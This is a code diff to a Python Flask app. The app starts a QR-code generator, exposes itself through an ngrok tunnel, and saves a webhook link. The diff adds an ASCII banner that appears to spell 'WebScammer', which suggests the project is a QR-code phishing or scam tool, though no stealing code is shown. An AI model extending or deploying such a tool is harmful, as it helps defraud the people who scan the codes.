@@ -11,7 +11,7 @@ app = Flask(__name__)
 @app.route("/")
 def main():
 	Thread(target=qr.genqr).start()
-	time.sleep(3)
+	time.sleep(5)
 	initial_count = -1
 	for path in pathlib.Path(fichier).iterdir():
 		if path.is_file():
@@ -23,6 +23,7 @@ def display_image(filename):
 	return redirect(url_for(filename='image/' + filename))
 
 if __name__ == '__main__':
+
 	try:
 		os.system("taskkill /f /im ngrok.exe")
 		os.system("cls")
@@ -40,6 +41,22 @@ if __name__ == '__main__':
 			webhook['webhook'] = link
 			json.dump(webhook, f)
 	try:
+		a = Fore.RED
+		b = Fore.WHITE
+		print(fr'''
+{a}$${b}\      {a}$${b}\           {a}$${b}\        {a}$$$$$${b}\                                                                     
+{a}$$ {b}| {a}${b}\  {a}$$ {b}|          {a}$$ {b}|      {a}$${b}  __{a}$${b}\                                                                    
+{a}$$ {b}|{a}$$${b}\ {a}$$ {b}| {a}$$$$$${b}\  {a}$$$$$$${b}\  {a}$$ {b}/  \__| {a}$$$$$$${b}\ {a}$$$$$${b}\  {a}$$$$$$\{a}$$$${b}\  {a}$$$$$${b}\{a}$$$${b}\   {a}$$$$$${b}\   {a}$$$$$${b}\  
+{a}$$ {a}$$ {a}$${b}\{a}$$ {b}|{a}$$  __{a}$${b}\ {a}$$  {b}__{a}$${b}\ \{a}$$$$$${b}\  {a}$$  {b}_____|\____{a}$${b}\ {a}$$  {b}_{a}$$  {b}_{a}$${b}\ {a}$$  {b}_{a}$$  {b}_{a}$${b}\ {a}$$  {b}__{a}$${b}\ {a}$$  {b}__{a}$${b}\ 
+{a}$$$$  {b}_{a}$$$$ {b}|{a}$$$$$$$$ {b}|{a}$$ {b}|  {a}$$ {b}| \____{a}$$\ {a}$$ {b}/      {a}$$$$$$$ {b}|{a}$$ {b}/-{a}$$ {b}/ {a}$$ {b}|{a}$$ {b}/ {a}$$ {b}/ {a}$${b} |{a}$$$$$$$$ |{a}$${b} |  \__|
+{a}$$$  {b}/ \{a}$$$ {b}|{a}$$  {b} ____|{a}$$ {b}|  {a}$$ {b}|{a}$${b}\   {a}$$ {b}|{a}$$ {b}|     {a}$$  {b}__{a}$$ {b}|{a}$$ {b}| {a}$$ {b}| {a}$$ {b}|{a}$$ {b}| {a}$$ {b}| {a}$$ {b}|{a}$$   {b}____|{a}$$ {b}|      
+{a}$$  {b}/   \{a}$$ {b}|\{a}$$$$$$${b}\ {a}$$$$$$${b}  |\{a}$$$$$$  {b}|\{a}$$$$$$${b}\\{a}$$$$$$$ {b}|{a}$$ {b}| {a}$$ {b}| {a}$$ {b}|{a}$$ {b}| {a}$$ {b}| {a}$$ {b}|\{a}$$$$$$${b}\ {a}$$ {b}|      
+{b}\__/     \__| \_______|\_______/  \______/  \_______|\_______|\__| \__| \__|\__| \__| \__| \_______|\__|      
+                                                                                                                                                          
+                                                                                                                                                          
+                                                                                                                                                          
+
+			''')
 		print(f"{Fore.CYAN}Your server link is {ngrok.connect(5000)}")
 		app.run()
 	except:
